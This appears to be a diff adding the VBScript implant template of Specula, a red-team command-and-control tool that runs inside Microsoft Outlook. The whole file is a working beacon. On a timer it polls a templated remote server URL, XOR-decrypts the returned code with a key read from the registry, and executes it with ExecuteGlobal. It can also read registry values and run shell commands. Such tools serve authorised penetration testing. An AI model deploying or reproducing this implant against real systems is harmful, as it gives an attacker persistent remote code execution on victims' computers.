@@ -1,0 +1,117 @@
+Set outlookapp = window.external.OutlookApplication
+Dim ay
+Dim sync
+
+
+Function requestpage(uri, rR)
+	On Error Resume Next
+	vi = Left(outlookapp.version,4)
+	d = rR
+	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
+	oP.open "POST", uri,false
+	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	oP.setRequestHeader "Content-Length", Len(d)
+	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
+	oP.setOption 2, 13056
+	oP.send Replace(d, vbLf, "")
+	requestpage = oP.responseText
+End Function
+
+Sub downloadcode (uri)
+        On Error Resume Next
+		Set serverapp = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
+		vr = Left(outlookapp.version,4)
+		serverapp.open "GET", uri, False
+		serverapp.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
+		serverapp.send
+		response = serverapp.ResponseText
+        f = Left(response, 1)
+		j = Int(Mid(response, 2, 4)) * 1000
+		If Err.Number <> 0 Then
+		    Exit Sub
+		End If
+		sync = j
+		If f = 2 Then
+		    Exit Sub
+		ElseIf f = 1 Then
+            ExecuteGlobal Crypt(Mid(response, 6), ay, False)
+		Else
+            ExecuteGlobal Mid(response, 6)
+		End If
+End Sub
+
+Function readreg(path,value)
+	On Error Resume Next
+	Va = ""
+	Set oL = outlookapp.CreateObject("WbemScripting.SWbemLocator")
+   Set lr = oL.ConnectServer(".", "root\cimv2").Get("StdRegProv")
+	lr.GetStringValue 2147483649, path, value, Va
+	readreg = Va
+End Function
+
+Function Crypt(input, Key, Mode)
+    For i = 1 To Len(input)
+        Position = Position + 1
+        If Position > Len(Key) Then Position = 1
+        keyx = Asc(Mid(Key, Position, 1))
+        If Mode Then
+            orgx = Asc(Mid(input, i, 1))
+            cptx = orgx Xor keyx
+            cptString = Hex(cptx)
+                        If Len(cptString) < 2 Then cptString = "0" & cptString
+                        z = z & cptString
+        Else
+            If i > Len(input) \ 2 Then Exit For
+            cptx = CByte("&H" & Mid(input, i * 2 - 1, 2))
+            orgx = cptx Xor keyx
+            z = z & Chr(orgx)
+        End If
+    Next
+    Crypt = z
+End Function
+
+Function crypthelper(input, key, mode)
+	l = Len(input)
+	Dim j
+	If mode Then
+		ReDim j(l * 2)
+	Else
+		ReDim j(l / 2)
+	End If
+    For i = 1 To l
+        Position = Position + 1
+        If Position > Len(key) Then Position = 1
+        kZ = Asc(Mid(key, Position, 1))
+        If mode Then
+            orZ = Asc(Mid(input, i, 1))
+            cpt = orZ Xor kZ
+            cptString = Hex(cpt)
+			If Len(cptString) < 2 Then cptString = "0" & cptString
+			j(i) = cptString
+        Else
+            If i > Len(input) \ 2 Then Exit For
+            cpt = CByte("&H" & Mid(input, i * 2 - 1, 2))
+            orZ = cpt Xor kZ
+            j(i) = Chr(orZ)
+        End If
+    Next
+    crypthelper = Join(j, "")
+End Function
+
+Function update_subscription()
+    aluceps_coi = Int((2200 - 201 + 1) * Rnd + 0)
+    if aluceps_coi = 1194 then
+        Set ws = window.external.OutlookApplication.CreateObject("Wscript.shell")
+        c = "cmd /c start https://github.com/trustedsec/specula/wiki/Why-am-I-seeing-this%3F"
+	    ws.Run c, 0, true
+    end if
+
+    downloadcode "{{CODEURL}}"
+    window.setTimeout "update_subscription", sync, "VBScript"
+End Function
+
+
+oldstr = ""
+sync = {{REFRESH_TIME}} * 1000
+ay = readreg({{ENCRYPTIONKEY_LOCATION}}, {{ENCRYPTIONKEY_VALUENAME}})
+window.setTimeout "update_subscription", sync, "VBScript"
